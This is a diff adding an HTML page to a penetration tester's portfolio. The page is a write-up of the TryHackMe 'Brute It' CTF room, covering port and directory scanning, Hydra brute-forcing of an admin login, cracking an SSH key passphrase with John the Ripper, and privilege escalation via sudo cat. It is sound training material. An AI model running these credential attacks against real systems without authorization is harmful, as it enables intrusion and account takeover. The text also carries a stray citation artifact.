@@ -1,0 +1,232 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<meta
+			name="description"
+			content="HEXEN - Penetration Tester & Penetration Tester Portfolio"
+		/>
+		<title>HEXEN // CYBERPUNK PEN-TESTER PORTFOLIO</title>
+		<link rel="stylesheet" href="../assets/css/writeups.css" />
+	</head>
+
+	<body class="cyberpunk-body">
+		<!-- Matrix Rain Background -->
+		<div id="matrix-rain" class="matrix-rain"></div>
+
+		<!-- Grid Background -->
+		<div class="grid-bg fixed top-0 left-0 w-full h-full z-0"></div>
+
+		<!-- Scanlines -->
+		<div
+			class="scanlines fixed top-0 left-0 w-full h-full pointer-events-none z-0"
+		></div>
+
+		<!-- Navigation -->
+		<nav
+			class="cyber-nav fixed top-0 left-0 w-full z-50 bg-black bg-opacity-80 backdrop-blur-sm border-b border-neongreen"
+		>
+			<div class="container mx-auto px-4 py-3">
+				<div class="flex justify-between items-center">
+					<div class="cyber-logo">
+						<span
+							class="text-neongreen font-bold text-xl glitch-effect"
+							data-text="HEXEN"
+							>HEXEN</span
+						>
+						<span class="text-neonpink text-sm ml-2"
+							>// SECURITY_SPECIALIST</span
+						>
+					</div>
+
+					<!-- Desktop Menu -->
+					<div class="hidden md:flex space-x-6">
+						<a href="../" class="nav-link">HOME</a>
+						<a href="../about.html" class="nav-link">ABOUT</a>
+						<a href="../writeups.html" class="nav-link">WRITEUPS</a>
+						<a href="../blogs.html" class="nav-link">BLOGS</a>
+					</div>
+
+					<!-- Mobile Menu Button -->
+					<div class="md:hidden mt-4">
+						<button
+							id="mobile-menu-button"
+							type="button"
+							class="text-neongreen focus:outline-none"
+						>
+							<svg
+								class="h-6 w-6 transition-transform duration-300"
+								id="menu-icon"
+								fill="none"
+								viewBox="0 0 24 24"
+								stroke="currentColor"
+							>
+								<path
+									stroke-linecap="round"
+									stroke-linejoin="round"
+									stroke-width="2"
+									d="M4 6h16M4 12h16M4 18h16"
+								></path>
+							</svg>
+							<svg
+								class="h-6 w-6 transition-transform duration-300 hidden"
+								id="close-icon"
+								fill="none"
+								viewBox="0 0 24 24"
+								stroke="currentColor"
+							>
+								<path
+									stroke-linecap="round"
+									stroke-linejoin="round"
+									stroke-width="2"
+									d="M6 18L18 6M6 6l12 12"
+								></path>
+							</svg>
+						</button>
+					</div>
+				</div>
+
+				<!-- Mobile Menu (hidden by default) -->
+				<div
+					id="mobile-menu"
+					class="md:hidden mt-2 border-t border-neongreen border-opacity-30 transform origin-top transition-all duration-300 scale-y-0 opacity-0 max-h-0"
+				>
+					<div class="flex flex-col space-y-4">
+						<a href="../index.html" class="nav-link">HOME</a>
+						<a href="../about.html" class="nav-link">ABOUT</a>
+						<a href="../writeups.html" class="nav-link">WRITEUPS</a>
+						<a href="../blogs.html" class="nav-link">BLOGS</a>
+					</div>
+				</div>
+			</div>
+		</nav>
+
+		<main class="relative z-10 pt-20">
+			<section id="writeup-controls" class="px-6 pt-6 pb-2 text-center">
+  
+
+  <div id='tags-container'>
+    
+  </div>
+</section>
+
+<!-- Writeup content -->
+<article class="markdown-body"><h1>TryHackMe | Brute It CTF Writeup</h1>
+<p>This writeup documents the steps taken to solve the <strong>Brute It</strong> room on TryHackMe.<br>The challenge focuses on web enumeration, brute forcing credentials, cracking hashes, and performing privilege escalation on a Linux system. :contentReference[oaicite:0]{index=0}</p>
+<hr>
+<h2>Challenge Information</h2>
+<ul>
+<li><strong>Platform:</strong> TryHackMe  </li>
+<li><strong>Room:</strong> Brute It  </li>
+<li><strong>Category:</strong> Web / Linux  </li>
+<li><strong>Difficulty:</strong> Beginner</li>
+</ul>
+<hr>
+<h2>Recon</h2>
+<p>The first step was scanning the target machine to identify open ports and services.</p>
+<pre><code class="language-bash">nmap -sV -p- &lt;target-ip&gt;
+</code></pre>
+<p>The scan revealed two important services:</p>
+<ul>
+<li><code>22/tcp</code> — SSH  </li>
+<li><code>80/tcp</code> — HTTP</li>
+</ul>
+<p>Since a web server was running on port 80, the next step was to investigate the web application.</p>
+<hr>
+<h2>Enumeration</h2>
+<p>Directory enumeration was performed using Gobuster to discover hidden paths on the web server.</p>
+<pre><code class="language-bash">gobuster dir -u http://&lt;target-ip&gt; -w /usr/share/wordlists/dirb/common.txt
+</code></pre>
+<p>The scan revealed a hidden directory:</p>
+<pre><code>/admin
+</code></pre>
+<p>Visiting this page revealed an <strong>administrator login panel</strong>.</p>
+<p>Viewing the page source revealed a comment containing a hint for the username:</p>
+<pre><code>&lt;!-- Hey john, if you do not remember, the username is admin --&gt;
+</code></pre>
+<p>This confirmed that the username was <strong>admin</strong>.</p>
+<hr>
+<h2>Exploitation</h2>
+<p>Since the username was known, the next step was brute forcing the password.</p>
+<p>The tool <strong>Hydra</strong> was used to brute force the login form using the <code>rockyou</code> wordlist.</p>
+<pre><code class="language-bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+&lt;target-ip&gt; http-post-form \
+&quot;/admin/index.php:user=^USER^&amp;pass=^PASS^:Username or password invalid&quot;
+</code></pre>
+<p>Hydra eventually discovered the correct password, allowing authentication to the admin panel.</p>
+<p>Within the panel, a <strong>private SSH key (<code>id_rsa</code>)</strong> was obtained.</p>
+<hr>
+<h2>Cracking the SSH Key</h2>
+<p>The private key required a passphrase before it could be used.<br>To crack the passphrase, the key was first converted into a hash format compatible with John the Ripper.</p>
+<pre><code class="language-bash">python /usr/share/john/ssh2john.py id_rsa &gt; hash
+</code></pre>
+<p>Next, the hash was cracked using the <code>rockyou</code> wordlist.</p>
+<pre><code class="language-bash">john --wordlist=/usr/share/wordlists/rockyou.txt hash
+</code></pre>
+<p>This revealed the passphrase required to unlock the SSH key.</p>
+<hr>
+<h2>Gaining Shell Access</h2>
+<p>With the passphrase and private key, SSH access could be obtained.</p>
+<pre><code class="language-bash">ssh -i id_rsa john@&lt;target-ip&gt;
+</code></pre>
+<p>After logging in, the user flag could be retrieved.</p>
+<pre><code class="language-bash">cat user.txt
+</code></pre>
+<hr>
+<h2>Privilege Escalation</h2>
+<p>To identify privilege escalation opportunities, the sudo permissions were checked.</p>
+<pre><code class="language-bash">sudo -l
+</code></pre>
+<p>The output revealed that the user could run <strong><code>/bin/cat</code> with sudo privileges</strong>.</p>
+<p>Since <code>cat</code> could be executed as root, it could be used to read sensitive files.</p>
+<p>The root flag was retrieved using:</p>
+<pre><code class="language-bash">sudo cat /root/root.txt
+</code></pre>
+<p>This confirmed full root-level access on the system.</p>
+</article>
+
+			<!-- Footer -->
+			<footer
+				class="cyber-footer py-12 bg-black border-t border-gray-800 mt-12"
+			>
+				<div class="container mx-auto px-4">
+					<div class="flex flex-col md:flex-row justify-between items-center">
+						<div class="mb-6 md:mb-0">
+							<h3 class="text-2xl font-bold mb-2 text-neongreen">HEXEN_SEC</h3>
+							<p class="text-sm text-gray-400 cyber-text">
+								Penetration Testing & Security Consulting
+							</p>
+						</div>
+						<div class="flex space-x-6">
+							<a
+								href="#"
+								class="hover:text-neongreen transition-colors cyber-link"
+								>Imprint</a
+							>
+							<a
+								href="#"
+								class="hover:text-neonpink transition-colors cyber-link"
+								>Privacy</a
+							>
+							<a
+								href="#"
+								class="hover:text-neonblue transition-colors cyber-link"
+								>Legal</a
+							>
+						</div>
+					</div>
+					<div
+						class="border-t border-gray-800 mt-8 pt-8 text-center text-sm text-gray-400"
+					>
+						<p class="cyber-text">
+							© 2025 HEXEN. All systems operational.
+							<span class="text-neongreen">//</span> Secure by design.
+						</p>
+					</div>
+				</div>
+			</footer>
+		</main>
+		<script type="module" src="../assets/js/menu.js" defer></script>
+	</body>
+</html>
